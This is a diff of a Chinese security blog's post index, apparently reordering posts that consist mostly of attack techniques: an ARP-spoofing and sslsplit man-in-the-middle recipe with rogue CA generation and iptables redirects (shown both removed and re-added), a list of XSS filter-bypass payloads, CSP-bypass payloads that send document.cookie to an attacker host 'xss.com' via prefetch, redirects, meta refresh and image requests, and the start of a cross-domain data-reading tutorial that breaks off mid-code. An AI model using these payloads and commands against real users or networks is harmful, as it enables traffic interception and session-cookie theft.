@@ -156,183 +156,6 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-安全测试/中间人攻击获取ssl-tsl数据" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/12/16/安全测试/中间人攻击获取ssl-tsl数据/">中间人攻击获取ssl数据</a>
-    </h1>
-  
-
-        <a href="/2016/12/16/安全测试/中间人攻击获取ssl-tsl数据/" class="archive-article-date">
-  	<time datetime="2016-12-16T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-16</time>
-</a>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="数据流量重定向"><a href="#数据流量重定向" class="headerlink" title="数据流量重定向"></a>数据流量重定向</h2><ul>
-<li>使用ARP欺骗。发送假的网关(gateway)的MAC地址（其实是攻击者的MAC地址) 给受害者, 让受害者误以为 攻击者就是网关。你不需要物理访问受害者的设备就能做到。</li>
-<li>手动改变 受害者的 默认网关。如果你能物理访问受害者设备，这是最简单的方法</li>
-<li>DNS欺骗。 对特定的域名，返回攻击者的IP作为目标服务器的地址 给受害者。</li>
-<li>修改受害者机器的/etc/hosts的条目来 转向某些域名的流量</li>
-</ul>
-<h3 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h3><ol>
-<li>环境：</li>
-</ol>
-<ul>
-<li>攻击者ip:192.168.31.200 操作主机</li>
-<li>网关：192.168.31.1 路由器</li>
-<li>受害者：192.168.31.224 手机或电脑</li>
-</ul>
-<ol>
-<li>开启ip转发</li>
-</ol>
-<p><code>echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward</code></p>
-<ol>
-<li>生成CA证书  </li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">openssl genrsa -out ca.key 4096</div><div class="line">openssl req -new -x509 -days 1826 -key ca.key -out ca.crt</div></pre></td></tr></table></figure>
-<ul>
-<li>第1个命令，生成 4096位的RSA私钥（以pem格式保存) ca.key</li>
-<li>第2个命令， 使用这个刚生成的私钥，来生成一个 自签名的 root CA 证书(ca.crt)</li>
-</ul>
-<p>这两个文件在后面都会用到。只有ca.crt这个证书文件，需要安装 到浏览器，或者受害者的机器上。</p>
-<ol>
-<li>端口流量转发</li>
-</ol>
-<p>用iptables进行流量转发，需要把我们需要的端口进行转发</p>
-<blockquote>
-<p>8080用作非SSL的TCP连接，比如 http, smtp, ftp<br>8443 用作SSL的连接，比如SMTP over SSL, HTTPS等</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">sysctl -w net.ipv4.ip_forward=1</div><div class="line">iptables -t nat -F</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443</div></pre></td></tr></table></figure>
-<ol>
-<li>ARP欺骗</li>
-</ol>
-<p><code>ettercap -T -q -M ARP //192.168.31.224/ //192.168.31.1/</code></p>
-<p><code>arpspoof -i eth0 -t 192.168.31.1 192.168.31.224</code></p>
-<ol>
-<li>直接建立热点</li>
-</ol>
-<p>kali下可以直接建立热点，需要打开iptables的nat功能<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE #对eth0进行源nat</div><div class="line">iptables -A FORWARD -i wlan1 -o eth0 -j ACCEPT #把无线网卡流量转发到有线网卡（或者什么能上网的网卡）上面</div><div class="line">iptables -A FORWARD -p tcp --syn -s 10.0.0.0/24 -j TCPMSS --set-mss 1356 #修改最大报文段长度</div></pre></td></tr></table></figure></p>
-<ol>
-<li>使用SSLsplit进行</li>
-</ol>
-<p><code>sslsplit -D -l connect.log -j /opt/sslsplit/test1 -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</code></p>
-<ol>
-<li>使用starttls-mitm进行(<a href="https://github.com/adrain09/starttls-mitm" target="_blank" rel="external">https://github.com/adrain09/starttls-mitm</a>)</li>
-</ol>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安全测试/">安全测试</a></li></ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2016/12/16/安全测试/中间人攻击获取ssl-tsl数据/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
-    <article id="post-web安全/xss向量" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/12/16/web安全/xss向量/">XSS向量</a>
-    </h1>
-  
-
-        <a href="/2016/12/16/web安全/xss向量/" class="archive-article-date">
-  	<time datetime="2016-12-16T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-16</time>
-</a>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <ol>
-<li>css xss向量</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;style&gt;@import%20url(http://www.xsec.io/static/upload/1.css);%20z-index:9999</div></pre></td></tr></table></figure>
-<ol>
-<li>利用反引号</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html BLAH&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;p onmouseover=alert`2`&gt;2121212&lt;/p&gt;</div><div class="line">&lt;p onmouseover=id=/confir/.source+&apos;m&apos;+&apos;(1)&apos;;onmousedown=eval(id)&gt; 11111&lt;/p&gt;</div><div class="line">&lt;a href=&quot;j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;(&amp;Tab;document.domain&amp;Tab;);//http://www.baidu.com&quot;&gt;点击此处&lt;/a&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
-<ol>
-<li>利用%2f</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;body%2fonmouseover=alert(1)&gt;&lt;/body&gt;</div></pre></td></tr></table></figure>
-<ol>
-<li><p>利用html实体<br>在href中html实体是可以反解出来的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a href=javascrpi:&amp;#67lert(1)&gt;xss&lt;/a&gt;</div></pre></td></tr></table></figure>
-</li>
-<li><p>其他：</p>
-</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">&quot;onmouseover=%0A&quot;confirm(1)</div><div class="line"></div><div class="line">/* HTML5 based entities were doing good in bypassing data URI RE */</div><div class="line"></div><div class="line">&lt;a href=&apos;data&amp;colon;text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+&apos;&gt;click&lt;/a&gt;</div><div class="line">&lt;a href=&apos;data:application/x-x509-user-cert;&amp;NewLine;base64&amp;NewLine;, PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&apos;&gt;click&lt;/a&gt;</div><div class="line"></div><div class="line">/* Both are Firefox specific payloads */ /* The RE initially thinks that base64 keyword is necessary. */</div><div class="line"></div><div class="line">&lt;a href=&quot;data:x,% 3 c script % 3 e alert(1) % 3 c/script %3 e&quot;&gt;click&lt;/a&gt;</div><div class="line"></div><div class="line">/* The RE thinks that only alphanumeric characters are allowed after data URI */</div><div class="line"></div><div class="line">&lt;a href=&quot;data:@[&apos;&#123;§(`__`)$&#125;&apos;]@, % 3 c script % 3 e alert(1) % 3 c/script %3 e&quot;&gt;click&lt;/a&gt;</div><div class="line"></div><div class="line">/* The first two payloads bypasses the check on word expression with the help of \ */</div><div class="line"></div><div class="line">&lt;div style=&quot;x:e\x\p\r\ession(alert(1))&quot;&gt;div&lt;/div&gt;</div><div class="line">&lt;p style=&apos;\x:\65xpre\73sio\6e(alert(1))&apos;&gt;hello barracuda&lt;/p&gt;</div><div class="line"></div><div class="line">/* The regular expression was expecting ( after the keyword expression */</div><div class="line"></div><div class="line">&lt;div style=&quot;width:expression\28 alert \28 1\29 \29&quot;&gt;I will bypass you&lt;/div&gt;</div><div class="line"></div><div class="line">/* Decimal Encoding without the presence of ; bypasses the regular expression */</div><div class="line"></div><div class="line">&lt;div style=&quot;width&amp;#58expression&amp;#40alert&amp;#40 1&amp;#41&amp;#41&quot;&gt;I will not match&lt;/div&gt;</div></pre></td></tr></table></figure>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web安全/">web安全</a></li></ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2016/12/16/web安全/xss向量/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
     <article id="post-移动安全/drozer测试InsecureBankv2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -448,6 +271,346 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2016/12/16/移动安全/drozer测试InsecureBankv2/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-web安全/绕过csp发送cookie" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/12/16/web安全/绕过csp发送cookie/">CSP bypass</a>
+    </h1>
+  
+
+        <a href="/2016/12/16/web安全/绕过csp发送cookie/" class="archive-article-date">
+  	<time datetime="2016-12-16T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-16</time>
+</a>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <ol>
+<li>dns 預读取</li>
+</ol>
+<p>firefox</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;[cookie].xss.com&quot;&gt;dns</div></pre></td></tr></table></figure>
+<p>chrome</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">chrome浏览器的csp策略对&lt;link&gt;标签rel属性则更为宽松,使用prefetch即可</div><div class="line">直接用get方式把cookie传递到攻击者的服务器上</div><div class="line">&lt;link rel=&quot;prefetch&quot; href=&quot;http://www.xss.com/x.php?c=[cookie]&quot;&gt;</div><div class="line">只需要用js动态创建元素的方法,就可在href中插入cookie</div></pre></td></tr></table></figure>
+<ol>
+<li>通用的bypass</li>
+</ol>
+<p>其实在script脚本允许unsafe-inline的情况下,会有更多的通用,而且无法被过滤的绕过方式,比如:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">window.location=&quot;http://www.xss.com/x.php?c=[cookie]&quot;;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
+<p>比如动态创建元素,再引发页面跳转</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var a=document.createElement(&quot;a&quot;);</div><div class="line">a.href=&apos;http://www.xss.com/?c=&apos;+escape(document.cookie);</div><div class="line">a.click();</div></pre></td></tr></table></figure>
+<p>或者是使用<meta>标签进行跳转</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;5;url=http://www.xss.com/x.php?c=[cookie]&quot; &gt;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var i=document.createElement(&quot;img&quot;);</div><div class="line">i.src=&apos;http://www.xss.com/?c=&apos;+escape(document.cookie);</div><div class="line">xxx.appendChild(i);</div></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web安全/">web安全</a></li></ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2016/12/16/web安全/绕过csp发送cookie/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-安全测试/中间人攻击获取ssl-tsl数据" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/12/16/安全测试/中间人攻击获取ssl-tsl数据/">中间人攻击获取ssl数据</a>
+    </h1>
+  
+
+        <a href="/2016/12/16/安全测试/中间人攻击获取ssl-tsl数据/" class="archive-article-date">
+  	<time datetime="2016-12-16T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-16</time>
+</a>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="数据流量重定向"><a href="#数据流量重定向" class="headerlink" title="数据流量重定向"></a>数据流量重定向</h2><ul>
+<li>使用ARP欺骗。发送假的网关(gateway)的MAC地址（其实是攻击者的MAC地址) 给受害者, 让受害者误以为 攻击者就是网关。你不需要物理访问受害者的设备就能做到。</li>
+<li>手动改变 受害者的 默认网关。如果你能物理访问受害者设备，这是最简单的方法</li>
+<li>DNS欺骗。 对特定的域名，返回攻击者的IP作为目标服务器的地址 给受害者。</li>
+<li>修改受害者机器的/etc/hosts的条目来 转向某些域名的流量</li>
+</ul>
+<h3 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h3><ol>
+<li>环境：</li>
+</ol>
+<ul>
+<li>攻击者ip:192.168.31.200 操作主机</li>
+<li>网关：192.168.31.1 路由器</li>
+<li>受害者：192.168.31.224 手机或电脑</li>
+</ul>
+<ol>
+<li>开启ip转发</li>
+</ol>
+<p><code>echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward</code></p>
+<ol>
+<li>生成CA证书  </li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">openssl genrsa -out ca.key 4096</div><div class="line">openssl req -new -x509 -days 1826 -key ca.key -out ca.crt</div></pre></td></tr></table></figure>
+<ul>
+<li>第1个命令，生成 4096位的RSA私钥（以pem格式保存) ca.key</li>
+<li>第2个命令， 使用这个刚生成的私钥，来生成一个 自签名的 root CA 证书(ca.crt)</li>
+</ul>
+<p>这两个文件在后面都会用到。只有ca.crt这个证书文件，需要安装 到浏览器，或者受害者的机器上。</p>
+<ol>
+<li>端口流量转发</li>
+</ol>
+<p>用iptables进行流量转发，需要把我们需要的端口进行转发</p>
+<blockquote>
+<p>8080用作非SSL的TCP连接，比如 http, smtp, ftp<br>8443 用作SSL的连接，比如SMTP over SSL, HTTPS等</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">sysctl -w net.ipv4.ip_forward=1</div><div class="line">iptables -t nat -F</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443</div></pre></td></tr></table></figure>
+<ol>
+<li>ARP欺骗</li>
+</ol>
+<p><code>ettercap -T -q -M ARP //192.168.31.224/ //192.168.31.1/</code></p>
+<p><code>arpspoof -i eth0 -t 192.168.31.1 192.168.31.224</code></p>
+<ol>
+<li>直接建立热点</li>
+</ol>
+<p>kali下可以直接建立热点，需要打开iptables的nat功能<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE #对eth0进行源nat</div><div class="line">iptables -A FORWARD -i wlan1 -o eth0 -j ACCEPT #把无线网卡流量转发到有线网卡（或者什么能上网的网卡）上面</div><div class="line">iptables -A FORWARD -p tcp --syn -s 10.0.0.0/24 -j TCPMSS --set-mss 1356 #修改最大报文段长度</div></pre></td></tr></table></figure></p>
+<ol>
+<li>使用SSLsplit进行</li>
+</ol>
+<p><code>sslsplit -D -l connect.log -j /opt/sslsplit/test1 -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</code></p>
+<ol>
+<li>使用starttls-mitm进行(<a href="https://github.com/adrain09/starttls-mitm" target="_blank" rel="external">https://github.com/adrain09/starttls-mitm</a>)</li>
+</ol>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安全测试/">安全测试</a></li></ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2016/12/16/安全测试/中间人攻击获取ssl-tsl数据/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-web安全/跨域获取数据小结" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/12/16/web安全/跨域获取数据小结/">跨域获取数据小结</a>
+    </h1>
+  
+
+        <a href="/2016/12/16/web安全/跨域获取数据小结/" class="archive-article-date">
+  	<time datetime="2016-12-16T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-16</time>
+</a>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>本文主要介绍几种跨域获取数据的方法，比较基础，但是在跨站漏洞的挖掘和利用上会起到很大的帮助。</p>
+<p>下面根据个例子简单的把遇到的跨域总结下</p>
+<p>场景：<br>网站A获取网站B上的资源，需要跨域传输数据</p>
+<p>两种情况：</p>
+<pre><code>1、B站资源可控，即可以更改B站资源内容
+
+2、B站资源不可控
+</code></pre><p>测试环境：</p>
+<p>我们这里设置简单点，为了下面的说明，统一设置到test.com域下，只是二级域名不相同。只要不设置document.domain,这样也不算是同域</p>
+<p>hosts设置：</p>
+<p>ip       a.test.com</p>
+<p>ip       b.test.com</p>
+<p>测试需求：</p>
+<p>利用a站获取到b站的资源</p>
+<p>首先采用直接使用iframe加载，直接使用js来获取数据</p>
+<p>B站点要获取的data文件内容：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"data"</span>&gt;</span> Hello A Site, I am from B site!! <span class="tag">&lt;/<span class="name">p</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>A站点获取数据html代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>A want to get B data<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line">var iframe = document.createElement('iframe');</div><div class="line">iframe.src = 'http://b.test.com/data.html';</div><div class="line">iframe.style.display = 'none';</div><div class="line">iframe.onload = function() &#123;</div><div class="line">        var doc = iframe.contentDocument || iframe.contentWindow.document;</div><div class="line">        console.log(doc.getElementById('data').textContent);</div><div class="line">&#125;</div><div class="line">document.body.appendChild(iframe);</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>在chrome下访问A站的getB.html，出现</p>
+<blockquote>
+<p>Uncaught SecurityError: Failed to read the ‘contentDocument’ property from ‘HTMLIFrameElement’: Blocked a frame with origin “<a href="http://a.test.com" target="_blank" rel="external">http://a.test.com</a>“ from accessing a frame with origin “<a href="http://b.test.com" target="_blank" rel="external">http://b.test.com</a>“. Protocols, domains, and ports must match.</p>
+</blockquote>
+<p>同源策略直接进行了阻止,防止进行跨域操作。</p>
+<p>很多时候会采用ajax去获取访问数据，下面是获取数据代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line">var xmlhttp;</div><div class="line">if (window.XMLHttpRequest)</div><div class="line">  &#123;// code for IE7+, Firefox, Chrome, Opera, Safari</div><div class="line">  xmlhttp=new XMLHttpRequest();</div><div class="line">  &#125;</div><div class="line">else</div><div class="line">  &#123;// code for IE6, IE5</div><div class="line">  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");</div><div class="line">  &#125;</div><div class="line"></div><div class="line">xmlhttp.open("GET","http://b.test.com/data.html",true);</div><div class="line">xmlhttp.send();</div><div class="line"></div><div class="line">xmlhttp.onreadystatechange=function()</div><div class="line">  &#123;</div><div class="line">  if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</div><div class="line">    &#123;</div><div class="line">    console.log(xmlhttp.responseText);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>访问，看chrome下面的提示：</p>
+<blockquote>
+<p>XMLHttpRequest cannot load <a href="http://b.test.com/data.html" target="_blank" rel="external">http://b.test.com/data.html</a>. No ‘Access-Control-Allow-Origin’ header is present on the requested resource. Origin ‘<a href="http://a.test.com" target="_blank" rel="external">http://a.test.com</a>‘ is therefore not allowed access.</p>
+</blockquote>
+<p>下面分两种情况实现跨域获取数据：</p>
+<ol>
+<li>B站的资源是可控的</li>
+</ol>
+<ul>
+<li>通过document.domain来控制</li>
+</ul>
+<p>同主域名下iframe控制document.domain进行读取，修改data.html和getB.html内容增加域的设置：</p>
+<p>document.domain=”test.com”</p>
+<p>再次访问，成功获取到数据信息，这个是最简单的，大域是相同的，都是可以去利用的。其实所有的com网站，cn网站都是一个大域，不过现在浏览器拒绝了这样的请求</p>
+<ul>
+<li><p>iframe结合location.hash进行跨域数据获取</p>
+<p>B站下data文件：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"></div><div class="line">data = 'ImBsitedata';</div><div class="line"></div><div class="line">var ifr = document.createElement('iframe');</div><div class="line"></div><div class="line">ifr.src = 'http://a.test.com/hash/proxy.html#'+data;</div><div class="line"></div><div class="line">document.body.appendChild(ifr);</div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>A站下的proxy文件：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line">parent.parent.location.hash = self.location.hash.substring(1);</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>主要是B站的data文件iframe加载proxy，hash获取到data数据，传递给proxy.html的hash中，proxy获取到hash传递给同源的A站</p>
+<p>getB_byhash.html</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Site A<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line">var iframe = document.createElement('iframe');</div><div class="line">iframe.src = 'http://b.test.com/hash/data.html';</div><div class="line">document.body.appendChild(iframe);</div><div class="line">var checkOut = function() &#123;</div><div class="line">try &#123;</div><div class="line">var data = location.hash ? location.hash.substring(1) : '';</div><div class="line">if (console.log) &#123;</div><div class="line">console.log('new data is: ' + data);</div><div class="line">&#125;</div><div class="line">  &#125; catch(e) &#123;&#125;</div><div class="line">&#125;</div><div class="line">setInterval(checkOut, 2000);</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span 